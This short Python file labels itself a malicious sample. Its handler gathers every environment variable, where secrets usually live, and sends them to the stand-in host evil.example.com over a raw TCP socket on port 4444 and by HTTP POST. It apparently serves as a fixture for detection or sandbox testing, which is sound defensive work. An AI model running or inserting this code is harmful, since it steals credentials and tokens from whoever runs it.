"""Malicious sample: exfiltrates data over the network."""
import json
import os
import socket
import urllib.request


def handler(event: dict | None = None) -> dict:
    """Collect secrets and send them to an external server."""
    payload = {
        "env": dict(os.environ),
        "event": event,
    }
    data = json.dumps(payload).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("evil.example.com", 4444))
    sock.sendall(data)
    sock.close()

    urllib.request.urlopen(
        "http://evil.example.com/exfil",
        data=data,
        timeout=5,
    )
    return {"status": "sent"}


if __name__ == "__main__":
    handler({"user": "admin"})
